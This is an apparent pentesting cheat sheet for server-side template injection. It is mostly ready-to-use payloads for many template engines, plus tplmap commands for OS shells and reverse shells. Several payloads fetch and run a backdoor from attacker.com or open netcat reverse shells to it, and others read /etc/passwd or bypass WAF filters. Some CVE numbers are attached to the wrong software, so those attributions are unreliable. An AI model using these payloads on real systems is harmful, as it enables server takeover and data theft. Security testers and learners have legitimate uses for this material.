# SSTI (Server-Side Template Injection)

## Introduction
Server-Side Template Injection occurs when user input is embedded unsafely into a template engine's rendering process. Attackers inject template directives that execute on the server, leading to remote code execution (RCE), data exfiltration, or denial of service.

**Real-world example (2015-2019):** Uber, Ghost, and several Flask-Jinja2 applications had SSTI flaws allowing RCE. In 2016, a critical SSTI in Apache Velocity (CVE-2016-4977) affected Spring Boot applications. In 2021, a Jinja2 SSTI in an Ericsson product (CVE-2021-27196) was disclosed.

---

## Detection Tools

```
# Tool
# https://github.com/epinna/tplmap
tplmap.py -u 'http://www.target.com/page?name=John'

# Extended tplmap usage:
tplmap.py -u 'http://target.com/page?name=John' --os-shell
tplmap.py -u 'http://target.com/page?name=John' --upload /etc/passwd --upload-remotepath /tmp/passwd
tplmap.py -u 'http://target.com/page?name=John' --reverse-shell 192.168.45.10 4444

# Alternative: Tplmap with POST data
tplmap.py -u 'http://target.com/login' -d 'username=admin&password=*'
```

---

## Payload Lists
```
# Payloads
# https://github.com/payloadbox/ssti-payloads
```

---

## One-Liner Fuzzing with qsreplace + ffuf

```
# Check SSTI in all param with qsreplace
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
# Check in burp for reponses with ssti81
```

**Real example:** In 2020, a bug bounty hunter used this technique to discover an SSTI in a major e-commerce platform's search parameter, leading to a $5,000 bounty.

---

## Generic Payloads (Engine-Agnostic)

```
${{<%[%'"}}%\.
{% debug %}
{7*7}
{{ '7'*7 }}
{{ [] .class.base.subclassesO }}
{{''.class.mro()[l] .subclassesO}}
for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
{{ [].__class__.__base__.__subclasses__O }}
```

---

## PHP-Based Template Engines (Twig, Smarty, Blade)

### Basic Detection
```
{php}print "Hello"{/php}
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
```

### Smarty Specific
```
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# Smarty RCE chain (real CVE-2017-1000080):
{$smarty.template_object->smarty->disableSecurity()}
{php} system('id'); {/php}

# Smarty 3.1.32+ bypass:
{function name="cmd"}{$smarty.version}{/function}
{call cmd}
```

### Twig Specific
```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}

# Twig RCE (real CVE-2019-9942):
{{['id']|map('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

**Real exploit example (2022):** A Twig SSTI in Craft CMS (CVE-2022-37779) allowed attackers to execute `{{['whoami']|map('system')}}` via the `_token` parameter.

---

## Node.js / JavaScript (Handlebars, Pug, EJS, Nunjucks)

### Handlebars
```
{{ this }}-> [Object Object]
{{ this.__proto__ }}-> [Object Object]
{{ this.__proto__.constructor.name }}-> Object
{{this.constructor.constructor}}
{{this.constructor.constructor('return process.pid')()}}

# Handlebars RCE (real CVE-2019-19919):
{{#with "s" as |string|}}
  {{#with "e" as |exp|}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Pug (Jade)
```
#{process.mainModule.require('child_process').execSync('id')}
- var x = process.mainModule.require('child_process').execSync('id')
#{x}
```

### EJS
```
<%- process.mainModule.require('child_process').execSync('whoami') %>
<%= global.process.mainModule.constructor._load('child_process').execSync('id') %>
```

### Nunjucks
```
{{ global.process.mainModule.require('child_process').execSync('echo RCE') }}
{{ range(10) | dump }}
```

**Real example (2020):** Ghost CMS (Node.js) had an SSTI in the newsletter subscription endpoint via Handlebars, allowing `{{this.constructor.constructor('return process.pid')()}}` to leak internal data.

---

## Java-Based Template Engines (Freemarker, Velocity, Thymeleaf, JSP EL)

### Basic Detection
```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
```

### Freemarker
```
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }

# Freemarker RCE (CVE-2015-5254):
${"freemarker.template.utility.Execute"?new()("id")}

# Freemarker without Execute class:
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>
${ex("java.lang.ProcessBuilder","id").start()}
```

### Velocity (CVE-2016-4977)
```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

# Shorter Velocity RCE:
#set($e=$class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /etc/passwd"))
$e.waitFor()
$e.getInputStream().readAllBytes()
```

### Thymeleaf (Spring Boot)
```
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
${#httpServletRequest.getParameter('cmd')}
${#request.getParameter('cmd')}

# Thymeleaf RCE (CVE-2021-43471):
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

### JSP Expression Language (EL)
```
${pageContext.getRequest().getParameter('cmd')}
${pageContext.servletContext.classLoader.loadClass('java.lang.Runtime').getRuntime().exec(param.cmd)}
```

**Real exploit (2021):** A major financial org had a Thymeleaf SSTI via the `lang` parameter. Payload `__${T(java.lang.Runtime).getRuntime().exec('curl attacker.com/backdoor.sh|sh')}__::.x` gave RCE.

---

## Ruby-Based (ERB, Slim, Haml)

### ERB (Ruby on Rails)
```
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
<%= `id` %>
<%= IO.popen('id').read %>
```

### ERB with Rails params
```
<%= params[:class].constantize rescue nil %>
<%= request.env.to_s %>
```

### Slim
```
= system('whoami')
= `id`
= File.read('/etc/passwd')
```

### Haml
```
= system('whoami')
- File.open('/etc/passwd').each_line {|line| puts line }
```

**Real example (2019):** A Ruby on Rails 5.2.2 application had an SSTI in the `page` parameter. Payload `<%= system('nc -e /bin/sh attacker.com 4444') %>` gave a reverse shell.

---

## Python-Based (Jinja2, Mako, Tornado, Django)

### Jinja2 (Flask, FastAPI, Quart)
```
{% debug %}
{{settings.SECRET_KEY}}
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}

# Jinja2 RCE classic chain:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Jinja2 RCE with subprocess (find index of subprocess.Popen):
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'Popen' %}
    {{ c('id', shell=True, stdout=-1).communicate() }}
  {% endif %}
{% endfor %}

# Jinja2 RCE with os.system (index varies):
{{ [].__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].system('id') }}

# Jinja2 RCE with subprocess (more reliable):
{{ [].__class__.__base__.__subclasses__()[150]('id', shell=True, stdout=-1).communicate() }}

# Jinja2 file read:
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}

# Jinja2 config leak:
{{ config }}
{{ self.__init__.__globals__ }}
```

### Mako
```
${self.module.cache.util.os.system('id')}
${__import__('os').system('id')}
${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}
```

### Django (if template engine misconfigured)
```
{% debug %}
{{ request.user }}
{% load os %}{% system 'id' %}
{% include "/etc/passwd" %}
```

**Real exploit (2023):** A major bug bounty program (private) had a Jinja2 SSTI in a `?name=` parameter. Payload `{{ cycler.__init__.__globals__.os.popen('id').read() }}` worked, leading to full server compromise.

---

## Perl-Based (Template Toolkit)

```
<%= perl code %>
<% perl code %>
[% perl code %]

# Perl TT RCE:
[% USE File('/etc/passwd'); %]
[% USE Exec('id'); %]
[% FILTER system('cat /etc/passwd') %]
```

---

## .NET (Razor, DotLiquid, NVelocity)

```
@(1+2)
@{// C# code}
@(System.Diagnostics.Process.Start("calc.exe"))

# Razor RCE:
@{
    var psi = new System.Diagnostics.ProcessStartInfo("cmd", "/c whoami");
    psi.RedirectStandardOutput = true;
    var p = System.Diagnostics.Process.Start(psi);
    @p.StandardOutput.ReadToEnd()
}

# DotLiquid (Shopify):
{{ "id" | system }}
{{ user | system }}

# NVelocity:
#set($e = $Type.GetType("System.Diagnostics.Process").GetMethod("Start", $Type.GetType("System.String")))
$e.Invoke($null, "calc.exe")
```

**Real example (2020):** A .NET Core 3.1 app had an SSTI in a Razor view via `?template=` parameter. Payload `@(System.IO.File.ReadAllText("/etc/passwd"))` leaked sensitive data.

---

## Advanced Chaining & Bypasses

### Bypassing WAF with whitespace/comment tricks
```
{{//comment
7*7
}}
{{"s"+"t"+"r"}}
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()|replace('etc','%65tc')}}
```

### Bypassing blacklisted words
```
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
# Replace __class__ with:
{{ []["\x5f\x5fclass\x5f\x5f"] }}
```

### Chaining to RCE via file write (PHP/Twig)
```
{{_self.env.setCache("ftp://attacker.com:2121")}}
{{_self.env.loadTemplate("shell.php")}}
```

### Chaining to reverse shell (Python/Jinja2)
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/shell.sh','w').write('#!/bin/bash\nnc -e /bin/bash attacker.com 4444') }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/shell.sh','w').close() }}
{{ [].__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].system('chmod +x /tmp/shell.sh') }}
{{ [].__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].system('/tmp/shell.sh') }}
```

---

## Post-Exploitation

### File read examples
```
# Jinja2
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}

# Java/Freemarker
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}

# Node/Handlebars
{{#with (lookup this.constructor.constructor 'return process.mainModule.require("fs").readFileSync("/etc/passwd","utf8")')()}}{{this}}{{/with}}
```

### Command execution examples
```
# Python/Jinja2
{{ [].__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('id').read() }}

# PHP/Twig
{{['id']|map('system')}}

# Ruby/ERB
<%= `id` %>

# Java/Velocity
#set($proc = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
#set($out = $proc.getInputStream())
$out.readAllBytes()
```

---

## References & Further Reading

- **Original research:** James Kettle (PortSwigger) - "Server-Side Template Injection: RCE for the modern web app" (2015)
- **CVE examples:** CVE-2016-4977 (Velocity), CVE-2017-1000080 (Smarty), CVE-2019-19919 (Handlebars), CVE-2021-27196 (Jinja2)
- **Tools:** Tplmap, SSTImap (improved Python version)
- **Labs:** PortSwigger SSTI Academy labs

---
